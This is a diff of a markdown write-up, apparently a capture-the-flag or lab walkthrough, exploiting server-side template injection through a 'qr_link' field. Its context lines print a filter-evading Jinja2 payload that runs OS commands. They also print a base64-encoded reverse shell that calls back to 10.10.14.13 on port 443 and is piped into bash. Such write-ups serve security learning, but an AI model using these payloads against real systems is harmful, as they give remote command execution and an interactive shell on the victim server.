@@ -261,7 +261,7 @@ base64 encoded image:
 
 <br />
 
-We try to manipulate the qr link field and we see it reflected in the response:
+We try to manipulate the "qr_link" field and we see it reflected in the response:
 
 <br />
 
@@ -280,7 +280,7 @@ We're being able to see our output reflected, so the first vulnerability that co
 
 Did it! The result of the operation is reflected in the output, so let's try to execute a command in the victim machine with one of the most typical jinja2 payloads to bypass the most common filters:
 
-Payload:
+`Payload`:
 
 <div style="font-family: monospace; background-color: #1e1e1e; color: white; padding: 10px; border-radius: 5px;">
 &#123;&#123;request&#124;attr(&#39;application&#39;)&#124;attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)&#124;attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)&#124;attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)&#124;attr(&#39;popen&#39;)(&#39;id&#39;)&#124;attr(&#39;read&#39;)()&#125;&#125;
@@ -307,7 +307,7 @@ YmFzaCAtYyAgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTMvNDQzICAwPiYxIgo=
 
 Once we have our payload encoded, we will simply have to enter it into the jinja payload and listen on port 443 to receive the connection when sending the request to the server:
 
-Final Payload:
+`Final Payload`:
 
 <div style="font-family: monospace; background-color: #1e1e1e; color: white; padding: 10px; border-radius: 5px;">
 &#123;&#123;request&#124;attr(&#39;application&#39;)&#124;attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)&#124;attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)&#124;attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)&#124;attr(&#39;popen&#39;)(&#39;echo+YmFzaCAtYyAgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTMvNDQzICAwPiYxIgo=&#124;base64+-d&#124;bash&#39;)&#124;attr(&#39;read&#39;)()&#125;&#125;
